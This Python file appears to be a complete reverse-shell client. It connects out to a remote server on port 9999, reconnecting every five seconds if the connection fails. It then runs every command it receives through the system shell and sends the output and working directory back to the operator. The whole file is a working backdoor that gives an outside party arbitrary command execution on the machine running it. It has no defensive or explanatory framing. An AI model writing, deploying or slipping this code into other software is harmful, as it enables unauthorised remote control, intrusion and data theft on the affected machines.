import os
import socket
import subprocess
import time


# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        time.sleep(5)
        socket_connect()


# Receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = s.recv(20480)
        # If data equals cd command
        if data[:2].decode("utf-8") == 'cd':
            try:
                # Handle dir changes
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        # Handle the quit command
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        # Check if there is any data
        if len(data) > 0:
            try:
                # Run command like in local cmd and output as string
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                # Output cmd's output in bytes to transfer over network
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                # Also take string version for display
                output_str = str(output_bytes, "utf-8")
                # Send output of client's current working directory
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))

            # Handle try
            except:
                output_str = "Command not recognized" + "\n"
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
    # Close the socket
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


main()